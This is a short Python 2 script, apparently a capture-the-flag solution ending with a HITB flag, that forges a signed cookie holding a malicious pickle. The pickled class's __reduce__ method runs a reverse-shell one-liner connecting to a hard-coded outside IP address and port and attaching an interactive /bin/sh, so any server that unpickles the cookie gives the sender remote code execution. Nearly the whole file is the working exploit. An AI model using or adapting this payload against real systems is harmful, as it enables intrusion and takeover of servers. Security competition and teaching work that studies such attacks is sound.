from base64 import b64decode as b64d
from base64 import b64encode as b64e
from hashlib import sha256
import pickle
import cPickle
import string
import platform
import os


def make_cookie(location, secret):
    return "%s!%s" % (calc_digest(location, secret), location)


def calc_digest(location, secret):
    return sha256("%s%s" % (location, secret)).hexdigest()
      

class Exploit(object):
    def __reduce__(self):
        return (platform.popen,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"123.206.203.108\",9876));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",))

secret = "hitb"

location = b64e(pickle.dumps(Exploit()))
print make_cookie(location, secret)

# HITB{Py5h0n1st8eBe3tNOW}
